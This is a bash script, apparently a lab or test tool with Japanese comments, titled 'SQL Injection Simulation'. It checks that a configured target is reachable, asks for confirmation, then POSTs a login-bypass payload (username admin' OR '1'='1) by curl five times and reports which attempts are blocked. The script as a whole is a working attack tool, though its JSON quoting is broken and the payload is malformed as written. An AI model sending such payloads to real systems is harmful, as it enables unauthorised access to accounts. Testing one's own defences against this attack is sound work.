#!/bin/bash


# 設定ファイル
source ./config/target.cfg
source ./config/attacks.cfg

echo '=========================================================='
echo '[*] SQL Injection Simulation'
echo '----------------------------------------------------------'
echo ' Target Info'
echo "   HOST : ${TARGET_HOST}"
echo "   PORT : ${TARGET_PORT}"
echo '----------------------------------------------------------'

url=http://${TARGET_HOST}:${TARGET_PORT}


# 接続確認
echo '[*] Pre-checking the target...'
code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 -X POST "${url}")"

if [[ "$code" == "200" ]]; then
    echo "[✓] Connectivity OK  -> ${url} (HTTP ${code})"
    echo
else
    echo "[!] Unable to connect to ${url}"
    exit 1
fi


# 攻撃コマンド実行
read -p '[*] 攻撃を開始しますか？ (y/n): ' answer
if [[ "$answer" != "y" ]]; then
    echo '[+] 攻撃を中止します。'
    exit 0
fi 

echo '[*] Sending SQL Injection payload...'
echo "    \`\`\`"
echo "    curl -lisS -X POST \\"
echo "      -H \"Content-Type: application/json\" \\"
echo "      -d \"{\"username\": \"admin' OR '1'='1\",\"password\": \"--\"}\" \\"
echo "      \"${url}\""
echo "    \`\`\`"
echo '----------------------------------------------------------'

# 1回目の実行
echo "[*] Attempt 1:" 
echo
curl -lisS -X POST \
    -H "Content-Type: application/json" \
    -d "{"username": "admin' OR '1'='1","password": "--"}" \
    "${url}"
echo
echo

# 2~5回目の実行
for i in {2..5}; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "{"username": "admin' OR '1'='1","password": "--"" "${url}")
    if [[ "$code" == "200" ]]; then
        echo "[✓] Attempt ${i}: Connected (${code} OK)"
    elif [[ "$code" == "401" ]]; then
        echo "[✗] Attempt ${i}: Blocked (${code} Unauthorized)"
    else
        echo "[!] Attempt ${i}: Other status (${code})"
        exit 1
    fi
done

echo 
echo '----------------------------------------------------------'
echo '[+] Completed.'
echo '=========================================================='
echo